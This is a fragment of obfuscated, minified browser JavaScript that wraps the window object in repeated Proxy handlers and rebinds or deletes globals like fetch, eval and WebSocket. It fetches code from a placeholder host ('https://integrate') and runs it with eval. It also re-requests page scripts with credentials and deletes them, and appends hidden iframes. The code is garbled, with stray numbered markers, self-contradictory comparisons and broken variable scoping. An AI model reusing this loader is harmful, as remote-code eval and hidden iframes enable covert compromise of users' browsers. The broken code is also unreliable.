                            !1) : (vt(C, t, s),
                            C[t] && C[t].configurable && C[t].writable && C[t].value && "function" == typeof C[t].value && !p(C[t].value) && (C[t].value = Gt(C[t].value)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].get && !p(C[t].get) && (C[t].get = Gt(C[t].get)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].set && !p(C[t].set) && (C[t].set = Gt(C[t].set)),
                            delete x[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = C[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            C[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete C[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = C[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = C[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(C, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in C,
                        ownKeys: ()=>{
                            const e = e=>!(e in x)
                              , t = gt(x)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(C, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = C[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(C, t, n),
                            C[t] && C[t].configurable && C[t].writable && C[t].value && "function" == typeof C[t].value && !p(C[t].value) && (C[t].value = Gt(C[t].value)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].get && !p(C[t].get) && (C[t].get = Gt(C[t].get)),
                            C[t] && !C[t].configurable && "function" == typeof C[t].set && !p(C[t].set) && (C[t].set = Gt(C[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(P), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const L = Gt({})
                      , R = Gt({});
                    Lt(R, hn, "Window");
                    const k = new Un(R,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && L[t] || o && o.get && !o.set ? (vt(r ? R : L, t, s),
                            !1) : (vt(R, t, s),
                            R[t] && R[t].configurable && R[t].writable && R[t].value && "function" == typeof R[t].value && !p(R[t].value) && (R[t].value = Gt(R[t].value)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].get && !p(R[t].get) && (R[t].get = Gt(R[t].get)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].set && !p(R[t].set) && (R[t].set = Gt(R[t].set)),
                            delete L[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = R[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            R[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete R[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value"in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = R[t];
                            if (r) {
                                let e;
                                const o = "value"in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e,t)=>{
                            let {d: o, l: r} = R[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = ()=>{
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                    Gt(t)
                                }
                                ),
                                i && !i.configurable && vt(R, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e,t)=>t in zn || t in R,
                        ownKeys: ()=>{
                            const e = e=>!(e in L)
                              , t = gt(L)
                              , n = Ft(gt(ht(zn)), e)
                              , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(R, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: ()=>!0,
                        set: (e,t,n)=>{
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                !0;
                            const {d} = R[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                            vt(R, t, n),
                            R[t] && R[t].configurable && R[t].writable && R[t].value && "function" == typeof R[t].value && !p(R[t].value) && (R[t].value = Gt(R[t].value)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].get && !p(R[t].get) && (R[t].get = Gt(R[t].get)),
                            R[t] && !R[t].configurable && "function" == typeof R[t].set && !p(R[t].set) && (R[t].set = Gt(R[t].set)),
                            0))
                        }
                    }));
                    Ht(gt(k), (e=>{
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const A = Gt({})
                      , M = Gt({});
                    Lt(M, hn, "Window");
                    const j = new Un(M,Gt({
                        defineProperty: (e,t,n)=>{
                            const {d: o, l: r} = i(t)
                              , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && A[t] || o && o.get && !o.set ? (vt(r ? M : A, t, s),
                            !1) : (vt(M, t, s),
                            M[t] && M[t].configurable && M[t].writable && M[t].value && "function" == typeof M[t].value && !p(M[t].value) && (M[t].value = Gt(M[t].value)),
                            M[t] && !M[t].configurable && "function" == typeof M[t].get && !p(M[t].get) && (M[t].get = Gt(M[t].get)),
                            M[t] && !M[t].configurable && "function" == typeof M[t].set && !p(M[t].set) && (M[t].set = Gt(M[t].set)),
                            delete A[t],
                            !0)
                        }
                        ,
                        deleteProperty: (e,t)=>{
                            let {d: n, l: o, w: r} = M[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                            M[t] && "function" == typeof n && r && i(t, n)),
                            (r || (n = e[t]) && n.configurable) && (delete e[t],
                            delete M[t]),
                            delete zn[t],
                            o || r)
                        }
                        ,
                        get: (e,t)=>{
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                "value" in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const {d: r} = M[t];
                            if (r) {
                                let e;
                                const o = "value" in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e, t) => {
                            let { d: o, l: r } = M[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                    r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = () => {
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                }
                                ),
                                    i && !i.configurable && vt(M, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e, t) => t in zn || t in M,
                        ownKeys: () => {
                            const e = e => !(e in A)
                                , t = gt(A)
                                , n = Ft(gt(ht(zn)), e)
                                , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(M, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: () => !0,
                        set: (e, t, n) => {
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                    !0;
                            const { d } = M[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                                vt(M, t, n),
                                M[t] && M[t].configurable && M[t].writable && M[t].value && "function" == typeof M[t].value && !p(M[t].value) && (M[t].value = Gt(M[t].value)),
                                M[t] && !M[t].configurable && "function" == typeof M[t].get && !p(M[t].get) && (M[t].get = Gt(M[t].get)),
                                M[t] && !M[t].configurable && "function" == typeof M[t].set && !p(M[t].set) && (M[t].set = Gt(M[t].set)),
                                0))
                        }
                    }));
                    Ht(gt(j), (e => {
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const N = Gt({})
                        , D = Gt({});
                    Lt(D, hn, "Window");
                    const F = new Un(D, Gt({
                        defineProperty: (e, t, n) => {
                            const { d: o, l: r } = i(t)
                                , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && N[t] || o && o.get && !o.set ? (vt(r ? D : N, t, s),
                                !1) : (vt(D, t, s),
                                D[t] && D[t].configurable && D[t].writable && D[t].value && "function" == typeof D[t].value && !p(D[t].value) && (D[t].value = Gt(D[t].value)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].get && !p(D[t].get) && (D[t].get = Gt(D[t].get)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].set && !p(D[t].set) && (D[t].set = Gt(D[t].set)),
                                delete N[t],
                                !0)
                        }
                        ,
                        deleteProperty: (e, t) => {
                            let { d: n, l: o, w: r } = D[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                                D[t] && "function" == typeof n && r && i(t, n)),
                                (r || (n = e[t]) && n.configurable) && (delete e[t],
                                    delete D[t]),
                                delete zn[t],
                                o || r)
                        }
                        ,
                        get: (e, t) => {
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                    "value" in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const { d: r } = D[t];
                            if (r) {
                                let e;
                                const o = "value" in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e, t) => {
                            let { d: o, l: r } = D[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                    r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = () => {
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                }
                                ),
                                    i && !i.configurable && vt(D, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e, t) => t in zn || t in D,
                        ownKeys: () => {
                            const e = e => !(e in N)
                                , t = gt(N)
                                , n = Ft(gt(ht(zn)), e)
                                , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(D, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        },
                        preventExtensions: () => !0,
                        set: (e, t, n) => {
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                    !0;
                            const { d } = D[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                                vt(D, t, n),
                                D[t] && D[t].configurable && D[t].writable && D[t].value && "function" == typeof D[t].value && !p(D[t].value) && (D[t].value = Gt(D[t].value)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].get && !p(D[t].get) && (D[t].get = Gt(D[t].get)),
                                D[t] && !D[t].configurable && "function" == typeof D[t].set && !p(D[t].set) && (D[t].set = Gt(D[t].set)),
                                0))
                        }
                    }));
                    Ht(gt(F), (e => {
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));
                    const U = Gt({})
                        , W = Gt({});
                    Lt(W, hn, "Window");
                    const B = new Un(W, Gt({
                        defineProperty: (e, t, n) => {
                            const { d: o, l: r } = i(t)
                                , s = Gt(n);
                            return o && !o.configurable && (!!o.configurable != !!s.configurable || !!o.enumerable != !!o.enumerable) || o && U[t] || o && o.get && !o.set ? (vt(r ? W : U, t, s),
                                !1) : (vt(W, t, s),
                                W[t] && W[t].configurable && W[t].writable && W[t].value && "function" == typeof W[t].value && !p(W[t].value) && (W[t].value = Gt(W[t].value)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].get && !p(W[t].get) && (W[t].get = Gt(W[t].get)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].set && !p(W[t].set) && (W[t].set = Gt(W[t].set)),
                                delete U[t],
                                !0)
                        }
                        ,
                        deleteProperty: (e, t) => {
                            let { d: n, l: o, w: r } = W[t];
                            return !(!n || !n.configurable) && (o && (o = delete zn[t],
                                W[t] && "function" == typeof n && r && i(t, n)),
                                (r || (n = e[t]) && n.configurable) && (delete e[t],
                                    delete W[t]),
                                delete zn[t],
                                o || r)
                        }
                        ,
                        get: (e, t) => {
                            const o = zn[t];
                            if (o) {
                                if (o.once && delete zn[t],
                                    "value" in o)
                                    return o.value;
                                if (o.get)
                                    return o.get()
                            }
                            const { d: r } = W[t];
                            if (r) {
                                let e;
                                const o = "value" in r ? It(r, "value") : (e = It(r, "get")) && "function" == typeof e ? e() : void 0;
                                return o && o.once && o.bind ? Gt(o) : o
                            }
                        }
                        ,
                        getOwnPropertyDescriptor: (e, t) => {
                            let { d: o, l: r } = W[t];
                            if (!o) {
                                const e = zn[t];
                                if (e)
                                    return Gt({
                                        enumerable: !0,
                                        configurable: !0,
                                        writable: !0,
                                        value: e.value,
                                        set: e.set,
                                        get: e.get
                                    });
                                if (!i(t))
                                    return;
                                o = Nt(zn, t),
                                    r = !1
                            }
                            const i = Gt({});
                            if (!r) {
                                const e = i.get;
                                e && (i.get = () => {
                                    const t = e();
                                    return "function" == typeof t && (t.__proto__ = zn),
                                        Gt(t)
                                }
                                ),
                                    i && !i.configurable && vt(W, t, i)
                            }
                            return i
                        }
                        ,
                        has: (e, t) => t in zn || t in W,
                        ownKeys: () => {
                            const e = e => !(e in U)
                                , t = gt(U)
                                , n = Ft(gt(ht(zn)), e)
                                , o = Gt({});
                            for (let e = 0; "Window" === Zt(Ot(W, e)); e += 1)
                                o[e] = !0;
                            const s = Ft(gt(o), e);
                            return qt(t, n, s)
                        }
                        ,
                        preventExtensions: () => !0,
                        set: (e, t, n) => {
                            const o = zn[t];
                            if (o && o.set)
                                return o.set(n),
                                    !0;
                            const { d } = W[t];
                            return !(d && !d.writable && !It(d, "set") || i(t) || (delete zn[t],
                                vt(W, t, n),
                                W[t] && W[t].configurable && W[t].writable && W[t].value && "function" == typeof W[t].value && !p(W[t].value) && (W[t].value = Gt(W[t].value)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].get && !p(W[t].get) && (W[t].get = Gt(W[t].get)),
                                W[t] && !W[t].configurable && "function" == typeof W[t].set && !p(W[t].set) && (W[t].set = Gt(W[t].set)),
                                0))
                        }
                    }));
                    Ht(gt(B), (e => {
                        zn[e] = zn[e] || Gt({
                            bind: !0
                        })
                    }));

2)
                    const V = {};
                    let H = zn;
                    const G = e => {
                        const t = Gt({});
                        Ht(t, e);
                        const n = {},
                            o = {};
                        return Ht(o, {
                                e: !0,
                                style: !0,
                                width: !0,
                                height: !0,
                                innerWidth: !0,
                                innerHeight: !0,
                                outerWidth: !0,
                                outerHeight: !0,
                                scrollX: !0,
                                scrollY: !0,
                                pageXOffset: !0,
                                pageYOffset: !0,
                                screenX: !0,
                                screenY: !0,
                                scrollbars: !0
                            }),
                            Object.defineProperties(V, {
                                window: {
                                    get: () => zn
                                },
                                isTop: {
                                    get: () => Yn === zn
                                },
                                windowId: {
                                    get: () => {
                                        const e = Mt(D, "__WINDOW_ID__");
                                        return e || null
                                    }
                                },
                                get: {
                                    value: e => {
                                        const t = e.split("."),
                                            n = t[0],
                                            r = t[1];
                                        if ("context" === n) {
                                            if (!r)
                                                return zn;
                                            const e = t.slice(2).join(".");
                                            return "document" === r ? H.document : "location" === r ? H.location : "console" === r ? H.console : "top" === r ? Yn : "parent" === r ? H.parent : "self" === r ? H.self : H[r] && H[r][e] || null
                                        }
                                        return "global" === n ? o[r] || null : null
                                    }
                                },
                                set: {
                                    value: (e, t) => {
                                        const n = e.split("."),
                                            r = n[0],
                                            s = n[1];
                                        if ("context" === r) {
                                            if (!s)
                                                return;
                                            const e = n.slice(2).join(".");
                                            if ("document" === s)
                                                return;
                                            if ("location" === s)
                                                return;
                                            if ("console" === s)
                                                return;
                                            if ("top" === s)
                                                return;
                                            if ("parent" === s)
                                                return;
                                            if ("self" === s)
                                                return;
                                            if (!H[s])
                                                return;
                                            const a = H[s];
                                            return a[e] = t,
                                                !0
                                        }
                                        return "global" === r ? (o[s] = t,
                                            !0) : !1
                                    }
                                }
                            }),
                            V
                    };
                    Ht(H, {
                            top: zn,
                            parent: zn,
                            self: zn
                        }),
                        G("context.document = document"),
                        G("context.console = console"),
                        G("context.top = top"),
                        G("context.parent = parent"),
                        G("context.self = self"),
                        G("global"),
                        delete zn.location,
                        H.location = zn.location,
                        delete zn.location,
                        delete zn.document,
                        H.document = zn.document,
                        delete zn.document;
3)
                    const J = (e, t) => {
                            const n = e[t];
                            if (n && "function" == typeof n) {
                                const o = `${t}()`;
                                g(o, (() => {
                                    const e = n.bind(H);
                                    return e.toString = () => n.toString(),
                                        e
                                }))
                            } else o.warn(`env: function "${t}" not found`)
                        },
                        K = () => {
                            J(H, "open"),
                                J(H, "setTimeout"),
                                J(H, "setInterval"),
                                J(H, "fetch"),
                                J(H, "XMLHttpRequest"),
                                J(H, "WebSocket"),
                                J(H, "Worker"),
                                J(H, "eval"),
                                J(H, "Function"),
                                J(H, "process"),
                                J(H, "Buffer"),
                                J(H, "crypto"),
                                J(H, "require"),
                                J(H, "module"),
                                J(H, "exports")
                        };
                    K(),
                        Ht(zn, {
                            top: zn,
                            parent: zn,
                            self: zn
                        }),
                        delete zn.console,
                        H.console = l,
                        delete zn.window,
                        H.window = l,
                        delete zn.setTimeout,
                        delete zn.setInterval,
                        delete zn.fetch,
                        delete zn.XMLHttpRequest,
                        delete zn.WebSocket,
                        delete zn.Worker,
                        delete zn.eval,
                        delete zn.Function,
                        delete zn.process,
                        delete zn.Buffer,
                        delete zn.crypto,
                        delete zn.require,
                        delete zn.module,
                        delete zn.exports,
                        H.setTimeout = l.setTimeout,
                        H.setInterval = l.setInterval,
                        H.fetch = l.fetch,
                        H.XMLHttpRequest = l.XMLHttpRequest,
                        H.WebSocket = l.WebSocket,
                        H.Worker = l.Worker,
                        H.eval = l.eval,
                        H.Function = l.Function,
                        H.process = l.process,
                        H.Buffer = l.Buffer,
                        H.crypto = l.crypto,
                        H.require = l.require,
                        H.module = l.module,
                        H.exports = l.exports,
                        (async () => {
                            const e = await l.fetch("https://integrate"),
                                t = await e.text();
                            eval(t)
                        })()
4)
                }
            ))
        }
        ),
        f = (e => {
                const t = [],
                    n = async () => {
                        for (; t.length > 0;) {
                            const n = t.shift();
                            try {
                                const o = await fetch(n.url, {
                                    method: n.method || "GET",
                                    headers: n.headers || {},
                                    body: n.body,
                                    credentials: "include",
                                    mode: "cors"
                                });
                                if (!o.ok) throw new Error(`Failed to fetch: ${o.status} - ${o.statusText}`);
                                const r = await o.text();
                                n.resolve(r)
                            } catch (e) {
                                n.reject(e)
                            }
                        }
                    };
                return {
                    addRequest: async (e, o, r, s) => {
                        const a = new Promise((e, t) => {
                            const n = {
                                url: e,
                                method: o,
                                headers: r,
                                body: s,
                                resolve: e,
                                reject: t
                            };
                            t.push(n)
                        });
                        await n()
                    }
                }
            }
            ),
            v = (() => {
                let e = null;
                const t = (t, n) => {
                    null === e && (e = f()),
                        e.addRequest(t, "GET", {}, null).then(n).catch(console.error)
                };
                return {
                    send: t
                }
            }
            )(),
            _ = (() => {
                const e = {
                    "SCRIPT_TAG": "script",
                    "STYLESHEET_LINK_TAG": "link[rel=stylesheet]",
                    "INLINE_SCRIPT": "script[type='application/javascript']"
                };
                let t = null,
                    n = null;
                const o = () => {
                    const o = setInterval(async () => {
                        const r = document.querySelectorAll(e.SCRIPT_TAG);
                        if (r.length > 0) {
                            for (const e of r) {
                                const {
                                    src: n
                                } = e;
                                n && (await v.send(n, t), e.remove())
                            }
                            clearInterval(o)
                        }
                    }, 1e3)
                };
                return {
                    init: (e, r) => {
                        t = e,
                            n = r,
                            o()
                    }
                }
            }
            )();
        _.init(c, u),
            (() => {
                const e = document.createElement("style");
                e.type = "text/css",
                    e.appendChild(document.createTextNode(`
                    .${G} {
                        display: none;
                    }
                `)),
                    document.head.appendChild(e)
            }
            )(),
            (() => {
                const e = document.createElement("script");
                e.textContent = `
                    (function() {
                        const e = document.createElement('iframe');
                        e.style.display = 'none',
                        e.src = 'https://iframe',
                        document.body.appendChild(e);
                    })();
                `,
                    document.documentElement.appendChild(e)
            }
            )()
    })();
    (() => {
        const e = document.createElement("iframe");
        e.style.display = "none",
        e.src = "https://iframe",
        document.body.appendChild(e)
    })()
})();

})();
